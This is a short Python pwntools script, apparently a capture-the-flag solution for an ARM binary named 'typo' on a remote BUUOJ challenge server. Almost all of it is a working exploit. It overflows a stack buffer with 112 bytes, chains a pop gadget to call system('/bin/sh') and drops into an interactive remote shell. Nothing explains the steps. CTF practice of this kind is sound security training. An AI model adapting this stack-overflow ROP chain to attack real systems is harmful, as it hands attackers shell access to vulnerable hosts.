from pwn import *

#p = process(['qemu-arm', './typo'])
p = remote('node4.buuoj.cn', 27667)
#wtf arm rop

bin_sh = 0x0006C384
system = 0x000110B4
pop_r0_r4_pc = 0x00020904

payload = b'a' * 112 + p32(pop_r0_r4_pc) + p32(bin_sh) * 2 + p32(system)

p.sendlineafter(b'quit', b'')

p.sendlineafter(b'\n', payload)

p.interactive()